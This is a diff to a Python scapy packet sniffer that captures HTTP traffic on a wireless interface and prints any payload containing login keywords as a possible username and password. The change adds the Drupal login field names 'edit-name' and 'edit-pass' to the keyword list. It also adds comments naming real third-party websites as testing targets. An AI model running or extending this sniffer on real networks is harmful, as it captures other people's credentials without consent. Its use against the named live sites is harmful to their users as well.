@@ -21,7 +21,7 @@ def get_url(packet):
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
-        keywords = ['username', 'user', 'login', 'mail', 'email', 'usuario', 'clave', 'password', 'pass']
+        keywords = ['username', 'user', 'login', 'mail', 'email', 'usuario', 'clave', 'password', 'pass', 'edit-name', 'edit-pass']
 
         if [keyword for keyword in keywords if keyword in load]:
                 return load
@@ -37,3 +37,9 @@ def process_sniffed_packet(packet):
             print('\n\n[+] Possible username/password > ' + loggin_info + '\n\n')
 
 sniff("wlan0")
+
+
+# Webs for testing purposes: 
+# http://iberianodonataucm.myspecies.info/
+# http://diptera.myspecies.info/
+# http://scratchpads.eu/explore/sites-list
